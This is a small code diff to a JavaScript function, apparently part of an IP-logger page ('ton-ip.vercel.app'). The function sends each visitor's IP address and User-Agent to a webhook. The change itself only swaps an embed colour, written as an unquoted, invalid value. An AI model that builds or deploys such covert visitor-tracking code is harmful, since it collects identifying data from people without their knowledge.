@@ -10,7 +10,7 @@ function sendDetailsToWebhook(details) {
         embeds: [{
             title: 'ton-ip.vercel.app',
             description: 'Details of the user accessing the page.',
-            color: #B4A4FF,
+            color: #E8FF00,
             fields: [
                 { name: 'IP Address', value: details.ip, inline: true },
                 { name: 'User-Agent', value: details.userAgent, inline: true },
